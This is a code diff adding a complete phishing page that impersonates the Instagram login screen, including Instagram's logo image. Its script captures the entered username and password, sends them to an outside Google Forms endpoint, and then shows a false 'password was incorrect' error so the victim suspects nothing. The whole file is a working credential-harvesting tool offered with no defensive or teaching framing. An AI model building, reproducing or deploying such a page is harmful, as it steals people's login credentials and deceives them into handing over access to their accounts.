@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #121212;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
+      width: 90%;
+      max-width: 300px;
+    }
+    .logo {
+      text-align: center;
+      font-size: 2em;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    input {
+      width: 90%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #333;
+      border-radius: 4px;
+      background: #262626;
+      color: #fff;
+      font-size: 14px;
+    }
+    input::placeholder {
+      color: #999;
+    }
+    button {
+      width: 99%;
+      padding: 12px;
+      background: #0095f6;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .error {
+      display: none;
+      color: #ed4956;
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="html-div x14z9mp x1lziwak xexx8yu xyri2b x18d9i69 x1c1uobl x9f619 xjbqb8w x78zum5 x15mokao x1ga7v0g x16uus16 xbiv7yw xseo6mj xod5an3 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png&quot;); background-position: 0px -2907px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></div>
+    <form id="loginForm">
+      <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required />
+      <input type="password" name="password" id="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+      <div class="error" id="errorMessage">Sorry, your password was incorrect. Please try again.</div>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Get input values
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Build the Google Form submission URL
+      const formURL = 'https://docs.google.com/forms/d/e/1FAIpQLScnSfzdacC7G8vS-VJ2fPTsyz27j5TsXDYDhQaoVKvPym0wpw/formResponse';
+      const formData = new FormData();
+      formData.append('entry.1854468290', username);
+      formData.append('entry.1140100791', password);
+
+      // Send data to Google Form
+      fetch(formURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: formData
+      });
+
+      // Show error message
+      document.getElementById('errorMessage').style.display = 'block';
+
+      // Optionally clear password field
+      document.getElementById('password').value = '';
+    });
+  </script>
+</body>
+</html>
